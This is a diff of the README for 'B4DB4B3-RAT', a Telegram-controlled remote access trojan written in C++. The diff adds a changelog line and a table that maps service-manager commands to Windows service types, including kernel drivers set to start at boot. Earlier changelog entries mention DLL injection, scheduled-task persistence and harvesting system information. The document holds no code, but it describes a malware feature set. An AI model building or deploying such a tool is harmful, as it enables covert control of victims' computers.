@@ -2,7 +2,7 @@
  Program for remote computer management using Telegram on C++ - by B4DB4B3
 ### [Interface]  
  ![UI](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/NEWUI.png)   
- ![EXAMPLE](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/EXAMPLE.png)   
+ ![EXAMPLE](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/COMMANDLIST.png)   
 ### [Weight of stub and builder]  
  #### P.S: Around 400-300 KB :)
  ![WEIGHT](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/WEIGHT.png)   
@@ -55,7 +55,32 @@ Date       | Time  | Description
 17.10.2020 | 16:30 | Code is optimized, added commands   
 18.10.2020 | 18:40 | Code is refactored and optimized, fixed bugs (command inject dll didn't work), added new function in builder (write in scheduler task), updated GUI, added re-launch protection, added commands ![NEWUI](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/NEWUI.png)
 19.10.2020 | 01:30 | Deleted traces of debugging (sorry for this), added more information about PC ![NEWINFO](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/NEWINFO.png)
+19.10.2020 | 17:20 | Clear warnings, added Service manager ![SERVICE](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/SERVICE.png)   
 
+## Service manager parse table:
+### [service add] params [Type] driver
+String param             | Value
+------------------------ | --------------------------
+win32-service            | SERVICE_WIN32
+adapter-service          | SERVICE_ADAPTER
+kernel-driver            | SERVICE_DRIVER
+interactive-process      | SERVICE_INTERACTIVE_PROCESS
+user-serice              | SERVICE_USER_SERVICE
+userservice-instance     | SERVICE_USERSERVICE_INSTANCE
+pkg-service              | SERVICE_PKG_SERVICE
+
+
+### [service add] param [StartType] driver
+
+String param             | Value
+------------------------ | --------------------------
+auto-start               | SERVICE_AUTO_START
+boot-start               | SERVICE_BOOT_START
+demand-start             | SERVICE_DEMAND_START
+disabled                 | SERVICE_DISABLED
+system-start             | SERVICE_SYSTEM_START
+
+#### Read more here: https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea
 
 # [LICENSE]
  ![B4DB4B3-RAT](https://github.com/4B4DB4B3/B4DB4B3-RAT) is licensed under MIT License - https://mit-license.org/
